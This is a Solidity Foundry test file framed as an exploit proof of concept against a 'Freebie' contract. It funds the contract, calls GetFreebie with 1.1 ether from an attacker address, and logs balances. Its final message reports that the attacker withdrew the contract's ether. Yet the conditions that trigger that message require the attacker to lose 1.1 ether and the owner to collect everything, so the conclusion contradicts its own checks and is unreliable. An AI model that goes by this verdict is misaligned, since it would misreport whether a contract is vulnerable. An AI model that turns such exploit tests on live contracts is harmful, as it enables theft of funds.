// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol";

contract FreebieExploitTest is Test {
    Freebie freebie;
    address owner = address(0x1234);
    address attacker = address(0x5678); // Changed to non-precompile address

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);

        vm.startPrank(owner);
        freebie = new Freebie();
        payable(address(freebie)).transfer(5 ether);
        vm.stopPrank();
    }

    function test_arbitraryEtherWithdrawal() public {
        // BEFORE-Trigger: Record initial state
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialContractBalance = address(freebie).balance;
        uint256 initialOwnerBalance = owner.balance;
        uint256 initialAttackerBalance = attacker.balance;
        console.log("Contract balance: %s", initialContractBalance);
        console.log("Owner balance: %s", initialOwnerBalance);
        console.log("Attacker balance: %s", initialAttackerBalance);

        console.log("--- Trigger GetFreebie ---");
        vm.prank(attacker);
        freebie.GetFreebie{value: 1.1 ether}();

        // AFTER-Trigger: Record state changes
        console.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(freebie).balance;
        uint256 ownerBalanceAfter = owner.balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance: %s", contractBalanceAfter);
        console.log("Owner balance: %s", ownerBalanceAfter);
        console.log("Attacker balance: %s", attackerBalanceAfter);

        // Differential checks
        console.log("--- Differential Results ---");
        bool contractDrained = (contractBalanceAfter == 0);
        bool ownerGained = (ownerBalanceAfter == initialOwnerBalance + initialContractBalance + 1.1 ether);
        bool attackerLost = (attackerBalanceAfter == initialAttackerBalance - 1.1 ether);
        bool exploitSuccess = contractDrained && ownerGained && attackerLost;
        
        console.log("Contract drained? %s", contractDrained ? "Yes" : "No");
        console.log("Owner gained expected funds? %s", ownerGained ? "Yes" : "No");
        console.log("Attacker lost exact amount? %s", attackerLost ? "Yes" : "No");

        // Final verdict based on state changes
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Attacker successfully withdrew contract's ether");
        } else {
            console.log("Vulnerability not Exist: Balances did not change as expected");
        }
    }
}